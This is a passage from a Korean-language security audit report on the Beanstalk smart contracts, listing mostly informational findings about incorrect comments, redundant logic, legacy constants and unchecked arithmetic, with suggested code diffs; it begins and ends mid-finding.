[`LibPolynomial::evaluatePolynomialPiecewise`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L85-L94)는 `placeInLine`에 해당하는 매개변수 `x`에 고정 소수점 소수(fixed-point decimals)가 없다고 간주하여 Pod당 가격을 평가한 다음 사용자 제공 `pricingFunction`에 따라 3차 다항식 함수를 실행합니다.

`x`에 소수점이 없는 것으로 간주하면 $n \neq 1$인 경우 각 항의 소수점이 $(n -1) \times 6$으로 증가하므로 $placeInLine^{n}$에 문제가 발생합니다. 따라서 이 오류는 `pricingFunction` 바이트에 의해 처리되어야 하며, 이는 5개의 구성 매개변수로 나눌 수 있습니다:
* n (32 bytes): 고려할 조각의 수에 해당합니다. 각 조각은 3차 다항식으로 구성됩니다.
* breakpoint (32n bytes): 평가가 한 조각에서 다른 조각으로 변경되는 `x` 값입니다. 조각당 하나의 중단점이 있습니다.
* significands (128n bytes): 조각당 4개, 가장 중요한 항에서 가장 덜 중요한 항 순서로 정렬됩니다.
* exponents (128n bytes): 조각당 4개, 가장 중요한 항에서 가장 덜 중요한 항 순서로 정렬됩니다.
* signs (4n bytes): 조각당 4개, 각 조각의 항 부호를 나타내며, 가장 중요한 항에서 가장 덜 중요한 항 순서로 정렬됩니다.

[`LibPolynomial`의 주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPolynomial.sol#L21-L45)에 제공된 예제에 주목하면, `x`가 추가 고정 소수점 소수를 갖지 않도록 의도되었음을 관찰할 수 있습니다. 그러나 이는 지수가 다음과 같이 정의되어야 함을 고려하여 `pricingFunction`을 통해 처리될 수 있습니다:
1. 3차 항에 해당하는 지수는 12 더하기 유효숫자(significand) 소수점이어야 합니다. $x$가 6개의 소수점을 가지므로 $x^{3}$은 18개의 소수점을 갖게 됩니다. 목표 정밀도와 값을 일치시키기 위해 $1 \times 10^{12}$로 나누는 것이 필요합니다.
2. 2차 항에 해당하는 지수는 6 더하기 유효숫자 소수점이어야 합니다. $x$가 6개의 소수점을 가지므로 $x^{2}$은 12개의 소수점을 갖게 됩니다. 목표 정밀도와 값을 일치시키기 위해 $1 \times 10^{6}$으로 나누는 것이 필요합니다.


### `LibSilo::_mow`에서 계정의 `lastUpdate`에 대한 중복 업데이트 로직 간소화 가능

현재 `LibSilo::_mow`에서 계정의 `lastUpdate`에 대한 업데이트는 두 번 발생합니다. [Flood 로직 처리 후](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L362)와 [함수 끝](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372)에서 다시 발생합니다. 이 두 번째 인스턴스는 [다른 문제](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L370-L371)에 대한 완화 조치로 추가된 것으로 보이지만, 성공적인 실행의 경우 항상 두 번째에 도달하고 나머지 로직 중 어느 것도 계정의 `lastUpdate` 값에 의존하지 않으므로 첫 번째 인스턴스는 더 이상 필요하지 않음을 의미합니다.

또한 첫 번째 업데이트 앞의 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L360-L361)은 여기에서 설명하는 케이스가 [`LibSilo::__mow`에 의해 처리](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L391-L393)되므로 관련이 없습니다. 마지막 줄기가 현재 줄기 팁과 같으면 실행이 종료되고 추가로 자란 stalk를 청구할 수 없습니다.


### `C.sol`에서 전역적으로 사용 가능한 Solidity 변수 사용

Solidity에서 시간 단위를 지정할 때 `seconds`, `minutes`, `hours`, `days` 및 `weeks` 접미사와 함께 리터럴 숫자를 사용할 수 있습니다. `C.sol` 상수 라이브러리에서 다음을 권장합니다:
```diff
- uint256 private constant CURRENT_SEASON_PERIOD = 3600;
+ uint256 private constant CURRENT_SEASON_PERIOD = 1 hours;
```


### `C.sol`의 잘못된 컨트랙트 주소

`C.sol`에는 BEAN/ETH Well 통합의 일부로 추가된 [두 개의 주소 상수](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L81-L82)가 있습니다. 현재 `BEANSTALK_PUMP`는 위의 [`TRI_CRYPTO`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L62) 상수에 의해 정의된 crv3crypto 주소를 참조하는 반면, `BEAN_ETH_WELL`은 코드가 없는 주소를 참조합니다. 이 주소들은 이 컨트랙트들의 최종 버전이 배포될 때까지 테스트 목적으로 임의로 선택된 것으로 이해됩니다. 또한 이 주소들은 시스템 내의 다른 기존 주소와의 충돌에도 불구하고 테스트 출력에 영향을 주지 않고 최신 커밋에서 업데이트된 것으로 이해됩니다.


### `DepotFacet`에 정의된 레거시 Pipeline 주소

현재 `DepotFacet`은 업데이트되어야 한다는 todo 주석과 함께 Pipeline의 이전 구현을 참조합니다:
```solidity
address private constant PIPELINE =
    0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.
```
이 todo 주석은 최신 커밋에서 해결되었으며 이제 다음과 같이 나타나야 합니다:
```diff
- address private constant PIPELINE = 0xb1bE0000bFdcDDc92A8290202830C4Ef689dCeaa; // TODO: Update with final address.
+ address private constant PIPELINE = 0xb1bE0000C6B3C62749b5F0c92480146452D15423;
```


### `FieldFacet::_sow` NatSpec의 잘못된 주석

`FundraiserFacet::fund`가 `FieldFacet::_sow` NatSpec의 토양 업데이트를 우회하는 방법을 설명하는 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/field/FieldFacet.sol#L131)은 `LibDibbler::sowWithMin`을 잘못 참조하고 있으며, 이는 아래와 같이 `LibDibbler::sowNoSoil`이어야 합니다:

```diff
    /**
     * @dev Burn Beans, Sows at the provided `_morningTemperature`, increments the total
     * number of `beanSown`.
     *
     * NOTE: {FundraiserFacet} also burns Beans but bypasses the soil mechanism
-    * by calling {LibDibbler.sowWithMin} which bypasses updates to `s.f.beanSown`
+    * by calling {LibDibbler.sowNoSoil} which bypasses updates to `s.f.beanSown`
     * and `s.f.soil`. This is by design, as the Fundraiser has no impact on peg
     * maintenance and thus should not change the supply of Soil.
     */
```


### `InitBip9`이 컨트랙트 NatSpec에서 BIP-8을 잘못 참조함

`InitBip9`에 대한 컨트랙트 NatSpec은 현재 BIP-8을 잘못 참조하고 있습니다. 혼동을 피하기 위해 업데이트해야 합니다:

```diff
    /**
     * @author Publius
-    * @title InitBip8 runs the code for BIP-8.
+    * @title InitBip9 runs the code for BIP-9.
    **/

contract InitBip9 {
```


### `InitBipNewSilo`의 잘못된 주석

`InitBipNewSilo`에는 다음 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L69)이 포함되어 있습니다:

> *emit event for unripe LP/Beans from 4 to 1 grown stalk per bdv per season*

그러나 후속 [이벤트 방출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L70-L71)에 사용된 [상수](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBipNewSilo.sol#L27-L28)가 의도한 대로 0이므로 이 주석은 올바르지 않습니다.


### 혼란을 피하기 위해 `InitDiamond`의 이중 할당을 제거해야 함

`InitDiamond`에서 "Weather" 케이스를 초기화할 때 혼란을 피하기 위해 제거해야 할 이중 할당이 있습니다:

```diff
- s.cases = s.cases = [
+ s.cases = [
        // Dsc, Sdy, Inc, nul
       int8(3),   1,   0,   0,  // Exs Low: P < 1
```


### `amounts.length > stems.length`인 상태로 `EnrootFacet::enrootDeposits`에서 호출될 때 `LibSilo::_removeDepositsFromAccount` 이벤트가 추가 `amounts` 요소와 함께 방출될 수 있음

가스 효율성을 위해 `EnrootFacet::enrootDeposits`는 `stems` 및 `amounts` 배열 인자의 길이가 동일한지 확인하지 않습니다. `stems` 배열을 [루핑](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L138)할 때 추가 `amounts` 요소는 사용되지 않은 상태로 유지되며 `amounts.length < stems.length`인 경우 인덱스 범위를 벗어난 오류가 발생합니다. 이 인자를 사용하는 [`LibSilo::_removeDepositsFromAccount`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L577)에 대한 [호출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L64-L69)도 마찬가지입니다. 그러나 `amounts`에 추가 요소가 포함된 경우 원치 않을 수 있는 [`LibSilo::TransferBatch`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L616) 및 [`LibSilo::RemoveDeposits`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L617) 이벤트가 방출됩니다.


### `TokenFacet::approveToken` NatSpec의 부정확한 주석

`TokenFacet::approveToken` NatSpec은 현재 이 함수가 내부 및 외부 토큰 잔액 모두에 대해 토큰을 승인한다고 [명시](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L102)합니다. 그러나 [`LibTokenApprove::approve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L21-L30)에 대한 [호출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L109)은 외부 잔액에 대해서는 승인하지 않고, [`TokenFacet::transferInternalTokenFrom`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L77)에서 [`LibTokenApprove.spendAllowance`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibTokenApprove.sol#L40-L55)를 [호출](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenFacet.sol#L94)해서만 소비되는 내부 잔액에 대해서만 승인하므로 이는 올바르지 않습니다.


### `ReentrancyGuard`를 상속하는 Facet에서 `AppStorage` 스토리지 포인터 변수 `s`의 섀도잉

`AppStorage` 스토리지 포인터 변수 `s`는 [`ReentrancyGuard`에서 정의](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/ReentrancyGuard.sol#L17)되며 첫 번째 스토리지 슬롯의 유일한 변수입니다. [`MigrationFacet::getDepositLegacy`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/MigrationFacet.sol#L95)와 [`LegacyClaimWithdrawalFacet::getWithdrawal`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/LegacyClaimWithdrawalFacet.sol#L71) 모두 레거시 예금/출금과 관련된 함수 본문 내에서 이 기존 선언을 섀도잉합니다. 이는 보안 위험을 초래하지 않지만 섀도잉된 선언을 제거하고 대신 상속된 컨트랙트에 정의된 스토리지 포인터를 사용하는 것이 좋습니다.


### `TokenSilo` NatSpec 및 레거시 참조에 대한 기타 주석

Beanstalk은 이전에 시즌별 베스팅 기간으로 대체된 출금 대기열을 구현했습니다. `TokenSilo` 컨트랙트 NatSpec은 현재 여전히 이 레거시 출금 시스템을 [참조](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L20-L21)하고 있지만 Stem 기반 예금 제거와 관련된 현재 구현을 반영하도록 업데이트해야 합니다.

또한 "Crates" 및 [`crateBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L348)에 대한 참조를 제거하고 각각 `bdvRemoved`로 업데이트해야 합니다. [`TokenSilo::tokenSettings`의 NatSpec](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/TokenSilo.sol#L430-L446)에는 `SiloSettings` 스토리지 구조체에도 존재하는 [`milestoneStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L403-L406) 및 [`encodeType`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L408-L411)에 대한 참조가 누락되어 있습니다. `AppStorage.sol` 내의 [선언](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) 요소 순서를 정확하게 반영하도록 이 주석을 재정렬하는 것을 고려하십시오.


### `Oracle::totalDeltaB` NatSpec의 잘못된 주석

현재 `Oracle::totalDeltaB`는 이 함수가 BEAN/3CRV Curve 유동성 풀에서 현재 Beans 부족/초과(`deltaB`)를 반환한다고 [명시](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L23)합니다. 그러나 [실제로는](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Oracle.sol#L26-L28) Curve 풀과 BEAN/ETH Well 모두에서 `deltaB`의 합계를 반환하므로 주석을 이를 반영하도록 업데이트해야 합니다.


### `Sun::setSoilAbovePeg`가 의도한 것보다 더 큰 `caseId` 간격을 고려함

[`Sun::setSoilAbovePeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L226-L234)의 NatSpec에 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L219)된 대로 Beanstalk은 *페그 위에 있을 때* 토양 수요를 측정하려고 합니다. 따라서 [`InitBip13`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/init/InitBip13.sol#L18-L30)의 구현을 기반으로 다음과 같이 수정해야 합니다:

```diff
-   if (caseId >= 24) {
+   if (caseId >= 28) {
         newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate
-   } else if (caseId < 8) {
+   } else if (4 <= caseId < 8) {
         newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate
    }
```

[`SeasonFacet::gm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L47-L62)에서 호출될 때 [`Sun::stepSun`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L66-L83)에 [전달되는](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L58) `caseId`는 [`Weather::stepWeather`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L100-L172) 내에서 이미 올바르게 계산되었기 때문에 이것은 토양 메커니즘에 영향을 미치지 않습니다. 그러나 구현이 의도에 엄격하게 부합하도록 로직을 수정하는 것이 좋습니다.


### `LibTokenSilo::removeDepositFromAccount` NatSpec의 부정확한 주석이 업데이트되어야 함

레거시 Silo v2 예금은 [레거시 매핑](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L149)에 저장되며, 현재 사용되지 않지만 마이그레이션되지 않은 레거시 예금은 여기에 남아 있습니다. `LibTokenSilo::removeDepositFromAccount` NatSpec의 [이 줄](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L218)은 레거시 예금 매핑을 참조하는 것으로 보이며 `uint256` 대 `Deposit` 매핑으로 저장된 새로운 [Silo v3 예금](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L156)으로 업데이트되어야 합니다. 이 주석이 이미 새로운 예금 매핑을 참조하려는 의도라면 `[token][stem]`이 매핑의 키로 사용되는 예금 식별자를 얻기 위해 토큰 주소와 stem 값의 연결을 나타낸다는 점을 명확히 해야 합니다.


### 사용되지 않는 레거시 함수 `LibTokenSilo::calculateStalkFromStemAndBdv` 제거 가능

`ConvertFacet::_depositTokensForConvert`에 [명시된](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L205-L207) 대로 레거시 함수 [`LibTokenSilo::calculateStalkFromStemAndBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L416-L428)는 더 이상 사용되지 않으므로 제거할 수 있습니다. 참조를 위해 이 함수를 계속 표시하려면 주석 처리하는 것이 좋습니다.


### `LibUniswapOracle::PERIOD` 주석 해결되어야 함

`LibUniswapOracle`에는 [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L22) 상수가 올바르지 않을 수 있음을 시사하는 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibUniswapOracle.sol#L21)이 있습니다. 이 값은 실제로 이미 올바른 것으로 이해되므로 todo 주석을 해결하고 Beanstalk 백서의 30분 룩백(lookback) 기간에 대한 모든 참조를 업데이트해야 합니다.


### `LibEthUsdOracle::getPercentDifference` NatSpec의 모호한 주석

[`LibEthUsdOracle::getPercentDifference`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Oracle/LibEthUsdOracle.sol#L80-L83)의 NatSpec에 있는 다음 주석은 모호합니다:
> *Gets the percent difference between two values with 18 decimal precision.*

이 함수는 18 소수점 정밀도로 백분율 차이를 반환하지만 인자로 받는 값이 반드시 18 소수점 정밀도여야 하는 것은 아닙니다. 그러나 두 값은 동일한 정밀도여야 하며, 이 경우 6 소수점입니다. 이러한 의도와 동작을 더 명확하게 하기 위해 주석을 수정하는 것이 좋습니다.


### Curve 관련 컨트랙트/라이브러리에 관한 기타 정보성 발견 사항

Curve 컨트랙트와 관련된 로직의 상당 부분은 기존 구현에서 복사되어 Vyper로 작성되었으며 Beanstalk 내에서 사용하고 더 넓은 Beanstalk 생태계 컨트랙트에 대한 온체인 참조를 위해 Solidity로 포팅된 것으로 이해됩니다. 여기서 확인된 가장 시급한 문제는 확인되지 않은 산술의 사용입니다. Beanstalk 컨트랙트에서 사용하는 Solidity 컴파일러 버전 0.7.6과 달리, Curve 컨트랙트에서 사용하는 Vyper 컴파일러는 기본적으로 정수 오버플로우 검사를 처리하고 감지되면 revert합니다. 이 기능이 필요한 다른 컨트랙트에서 Beanstalk은 OpenZeppelin SafeMath 라이브러리를 사용합니다. 그러나 [`LibCurve`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L13), [`CurvePrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L17) 및 [`BeanstalkPrice`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/BeanstalkPrice.sol#L7)에서는 전혀 그렇지 않습니다. 결과적으로 발생할 수 있는 특정 취약점을 식별할 수 없었지만(이 참여의 시간 제약으로 인해), 확인되지 않은 산술 연산자 대신 SafeMath 함수를 사용하여 기존 Vyper 구현에 최대한 가깝게 이러한 컨트랙트를 구현하는 것이 좋습니다. `LibBeanMetaCurve`는 SafeMath 라이브러리를 가져오지만 여전히 [확인되지 않은 산술](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L58)의 일부 [인스턴스](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L40)를 포함하고 있습니다. 이것이 의도적인 경우 최소한 그렇게 하는 것이 안전한 이유를 설명하는 주석을 달아야 합니다. 그렇지 않으면 여기에도 권장 사항이 적용됩니다.

다음과 같은 추가 정보성 발견 사항이 확인되었습니다:
* `CurvePrice::getCurveDeltaB` 및 `LibBeanMetaCurve::getDeltaBWithD` 모두 `uint256`에서 `int256`으로의 [안전하지 않은](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/ecosystem/price/CurvePrice.sol#L56) [캐스트](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibBeanMetaCurve.sol#L59)를 포함합니다. 페그에서의 bean 수와 해당 평형 풀 BEAN 잔액 모두 최대 `int256` 값을 초과할 가능성이 매우 낮으므로 문제가 발생할 가능성은 낮지만, 확인되지 않은 산술 사용에 관한 권장 사항과 함께 해결하는 것이 좋습니다.
* 정규화된 준비금 및 비율을 기반으로 가격을 계산할 때 [1로 곱하는 것](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L43)은 추가 정밀도를 추가하지 않으며 BEAN 비율의 정밀도가 이미 30 소수점으로 충분하므로 불필요하고 중복됩니다.
* `LibCurve::getD`에서 [참조된 구현](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L88)은 [여기](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L98)의 경우와 같이 `256`이 아닌 `255`를 Newton-Raphson 근사 반복 횟수의 상한으로 사용합니다. 실제로는 근사치가 이 두 값 중 하나에 가까워지기 훨씬 전에 수렴해야 하므로 추가 가스 사용 가능성은 낮습니다.
* `LibCurve::getD`가 수렴하지 못하는 경우 이 함수는 [revert됩니다](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L110). 따라서 [0을 반환](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L111)하는 도달할 수 없는 코드 줄은 필요하지 않은 것으로 보입니다.
* `LibCurve::getXP`의 NatSpec에는 작은 [실수](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Curve/LibCurve.sol#L151)가 포함되어 있습니다:
```diff
    /**
     * @dev Return the `xp` array for two tokens. Adjusts `balances[0]` by `padding`
     * and `balances[1]` by `rate / PRECISION`.
     *
-    * This is provided as a gas optimization when `rates[0] * PRECISION` has been
+    * This is provided as a gas optimization when `rates[0] / PRECISION` has been
     * pre-computed.
     */
```
* [`LibCurveConvert::beansToPeg`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibCurveConvert.sol#L24-L35)의 `xp1` 변수는 의미상 올바르게 `xp0`으로 이름이 변경되어야 합니다.
* `CurveFacet::is3Pool`은 다른 함수와 동일한 들여쓰기로 포맷되어야 합니다. `forge fmt`와 같은 포맷팅 도구를 실행하는 것을 고려하십시오.
* `CurveFacet::removeLiquidityImbalance` 내의 기존 [`token`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244) 선언은 동일한 값이 할당될 [`lpToken`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/CurveFacet.sol#L244)을 선언하는 대신 조건부 3Pool/Tri-Crypto 블록에 들어갈 때 재사용할 수 있습니다.


### `LibPRBMath`의 레거시 코드는 제거되어야 함

`LibPRBMath`에 있는 [`SCALE_LPOTD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L24) 및 [`SCALE_INVERSE`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L28) 상수의 주석 처리된 버전은 원래 [PRBMath 라이브러리](https://github.com/PaulRBerg/prb-math/blob/e33a042e4d1673fe9b333830b75c4765ccf3f5f2/contracts/PRBMath.sol#L113-L118)에서 가져왔으며 부호 없는 60.18 소수점 고정 소수점 숫자와 함께 작동하도록 의도되었습니다. 이 상수들의 [주석 처리되지 않은 버전](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L37-L42) 값은 원래 작성자가 Beanstalk에 필요한 수정을 위해 파생한 것으로 이해됩니다. 이러한 수정 사항은 더 이상 사용되지 않으므로 [`LibPRBMath::powu`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L44-L57), [`LibPRBMath::logBase2`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L33-L66) 및 [`LibPRBMath::mulDivFixedPoint`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibPRBMath.sol#L59C14-L96)와 함께 제거되어야 합니다.


### `LibIncentive`에서 사용되지 않는/불필요한 상수 제거

`LibIncentive`는 현재 Uniswap Oracle 룩백 윈도우에 대해 [`PERIOD`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L23-L24) 상수를 정의하는데, 이는 사용되지 않으며 올바르지 않습니다. 이것은 제거되어야 합니다. 이 라이브러리는 또한 [`BASE_FEE_CONTRACT`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibIncentive.sol#L45-L46)를 정의하는데, 이는 `C.sol`의 동일한 이름과 값을 가진 상수를 섀도잉합니다. 이는 `C.sol`의 [정의](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/C.sol#L75-L76)를 위해 제거될 수 있습니다.


### `IBeanstalk` 인터페이스는 Stem 기반 예금을 참조하도록 업데이트되어야 함

[`IBeanstalk`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/interfaces/IBeanstalk.sol#L26) 인터페이스는 현재 여러 함수에 대해 이전 인터페이스를 참조하고 있으므로 업데이트해야 합니다:

```diff
    function transferDeposits(
        address sender,
        address recipient,
        address token,
